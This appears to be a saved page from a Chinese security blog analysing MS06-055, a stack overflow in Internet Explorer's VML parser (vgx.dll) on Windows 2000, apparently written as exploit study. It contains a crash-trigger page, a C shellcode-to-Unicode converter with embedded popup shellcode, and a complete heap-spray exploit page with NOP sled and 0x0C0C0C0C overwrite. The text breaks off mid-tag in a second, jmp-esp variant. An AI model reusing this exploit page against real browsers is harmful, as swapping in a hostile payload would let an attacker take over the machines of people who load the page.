@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="概述在Windows 2000 SP0平台下， vgx.dll 版本为5.0.3014.1003，文件大小为1753160字节，漏洞函数地址为0x659D7B46，用于解析VML语言的_IE5_SHADETYPE_TEXT函数，：    动态分析用于测试测试的HTML： 1234567891011121314&amp;lt;html xmlns:v=&quot;urn:schemas-microsoft-com:v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MS06-055分析">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;27&#x2F;MS06-055&#x2F;index.html">
+<meta property="og:site_name" content="Ivoripuion&#39;s blog">
+<meta property="og:description" content="概述在Windows 2000 SP0平台下， vgx.dll 版本为5.0.3014.1003，文件大小为1753160字节，漏洞函数地址为0x659D7B46，用于解析VML语言的_IE5_SHADETYPE_TEXT函数，：    动态分析用于测试测试的HTML： 1234567891011121314&amp;lt;html xmlns:v=&quot;urn:schemas-microsoft-com:v">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;27&#x2F;MS06-055&#x2F;info1.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;27&#x2F;MS06-055&#x2F;info2.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;27&#x2F;MS06-055&#x2F;info3.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;27&#x2F;MS06-055&#x2F;dbg1.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;27&#x2F;MS06-055&#x2F;success1.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;27&#x2F;MS06-055&#x2F;dbg2.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;27&#x2F;MS06-055&#x2F;dbg3.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;27&#x2F;MS06-055&#x2F;success2.JPG">
+<meta property="og:updated_time" content="2020-04-28T14:56:41.338Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;27&#x2F;MS06-055&#x2F;info1.JPG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/27/MS06-055/"/>
+
+
+
+
+
+  <title>MS06-055分析 | Ivoripuion's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ivoripuion's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pwn">
+          <a href="/categories/pwn" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            pwn
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reverse">
+          <a href="/categories/reverse" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            reverse
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-随想">
+          <a href="/categories/%E9%9A%8F%E6%83%B3" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            随想
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/27/MS06-055/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">MS06-055分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-27T19:32:15+08:00">
+                2020-04-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在Windows 2000 SP0平台下， vgx.dll 版本为5.0.3014.1003，文件大小为1753160字节，漏洞函数地址为0x659D7B46，用于解析VML语言的_IE5_SHADETYPE_TEXT函数，：</p>
+<p><img src="/2020/04/27/MS06-055/info1.JPG" alt></p>
+<p><img src="/2020/04/27/MS06-055/info2.JPG" alt></p>
+<p><img src="/2020/04/27/MS06-055/info3.JPG" alt></p>
+<h1 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h1><p>用于测试测试的HTML：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:v</span>=<span class="string">"urn:schemas-microsoft-com:vml"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>fortest<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!--v\:* &#123; behavior: url(#default#VML); &#125;--&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v:rect</span> <span class="attr">style</span>=<span class="string">"HEIGHT: 444pt; WIDTH: 444pt"</span> <span class="attr">coordsize</span> = <span class="string">"21600,21600"</span> <span class="attr">fillcolor</span> = <span class="string">"yellow"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v:fill</span> <span class="attr">method</span> = <span class="string">"AAAA"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">v:rect</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">v:fill</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>patch到漏洞点，第一个函数运行完毕后堆栈情况：</p>
+<p><img src="/2020/04/27/MS06-055/dbg1.JPG" alt></p>
+<p>&lt;v:fill method = “AAAA”&gt;被函数sub_659D7AEA解析后，将内容”AAAA”复制到栈空间中，当该参数足够多时就会导致溢出。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>这里使用heap spary的方式进行攻击，这里首先需要对shellcode进行一个简单的转码，转化为JavaScript所能够识别的Unicode格式：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">FILE * fp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A2U</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> * ascii, <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> unicode = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="built_in">size</span>; i += <span class="number">2</span>)<span class="comment">//read a unicode</span></span><br><span class="line">	&#123;</span><br><span class="line">		unicode = (ascii[i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + ascii[i];</span><br><span class="line">		<span class="comment">//printf("\\u%0.4x", unicode);</span></span><br><span class="line">		<span class="built_in">fprintf</span>(fp, <span class="string">"\\u%0.4x"</span>, unicode);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> popup_general[] =</span><br><span class="line">	<span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line">	<span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line">	<span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line">	<span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line">	<span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line">	<span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line">	<span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line">	<span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line">	<span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line">	<span class="string">"\x53\x68\x74\x65\x73\x74\x68\x6D\x69\x78\x69\x8B\xC4\x53\x50\x50"</span></span><br><span class="line">	<span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span>;</span><br><span class="line">	<span class="keyword">if</span> ((fp = fopen(<span class="string">"unicode_shellcode.txt"</span>, <span class="string">"w"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	A2U(popup_general, <span class="number">168</span>);</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp页面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:v</span>=<span class="string">"urn:schemas-microsoft-com:vml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>failwest<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--v\:* &#123; behavior: url(#default#VML); &#125;--&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> shellcode=<span class="string">"\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6574\u7473\u6d68\u7869\u8b69\u53c4\u5050\uff53\ufc57\uff53\uf857"</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> nop=<span class="string">"\u9090\u9090"</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">while</span> (nop.length&lt;= <span class="number">0x100000</span>/<span class="number">2</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    nop+=nop;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nop = nop.substring(0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2 );</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> slide = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">200</span>; i++)</span></span><br><span class="line">&#123;</span><br><span class="line">    slide[i] = nop + shellcode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">v:rect</span> <span class="attr">style</span>=<span class="string">"width:444pt;height:444pt"</span> <span class="attr">fillcolor</span>=<span class="string">"black"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">v:fill</span> <span class="attr">method</span>=<span class="string">"&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;&amp;#x0c0c;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">v:rect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于这里的栈空间长度过大，使用heap spray的方式攻击较为方便，创建200个大小为1MB的块，填充(nop+(32 bytes)堆块信息+(4 bytes)字符串长度+(2 bytes)字符串结束符)，最后将栈空间的内容填充为0x0C0C0C0C，这样当程序返回地址返回到0x0C0C0C0C时，遇到nop就会跳过，运行到shellcode部分：</p>
+<p><img src="/2020/04/27/MS06-055/success1.JPG" alt></p>
+<p>当然也可以算出返回地址距离参数的长度，patch掉，然后再返回地址填充”jmp esp”，再接shellcode即可：</p>
+<p>payload=(520 bytes)patch+</p>
+<p>(4 bytes)jmp_esp+</p>
+<p>0x90909090+0x9090909090+</p>
+<p>shellcode</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:v</span>=<span class="string">"urn:schemas-microsoft-com:vml"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>fortest<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!--v\:* &#123; behavior: url(#default#VML); &#125;--&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v:rect</span> <span class="attr">style</span>=<span class="string">"HEIGHT: 444pt; WIDTH: 444pt"</span> <span class="attr">coordsize</span> = <span class="string">"21600,21600"</span> <span class="attr">fillcolor</span> = <span class="string">"yellow"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v:fill</span> <span class="attr">method</span> = <span 